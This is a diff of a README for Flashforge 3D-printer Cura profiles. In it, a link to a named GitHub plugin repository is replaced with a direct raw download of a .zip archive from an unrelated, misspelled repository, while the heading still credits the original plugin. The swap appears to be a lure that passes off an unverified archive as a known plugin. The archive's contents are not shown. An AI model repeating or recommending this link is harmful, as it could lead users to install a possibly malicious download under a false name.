@@ -18,4 +18,4 @@ If you first test then use a generic PLA, ABS or PETG profile. Dreamer NX print 
 What is otherwise Flashprint's initial settings are the same as Adventurer 3 speeds. Although I've changed the speeds to improve printing.
 
 # Added Ronoaldo .GX plugin.
-https://github.com/ronoaldo/FlashforgeFinderIntegration
+https://raw.githubusercontent.com/ajzbern/Flasforge_Adventurer-3_Cura_Definition/master/southermost/Flasforge_Adventurer-3_Cura_Definition.zip
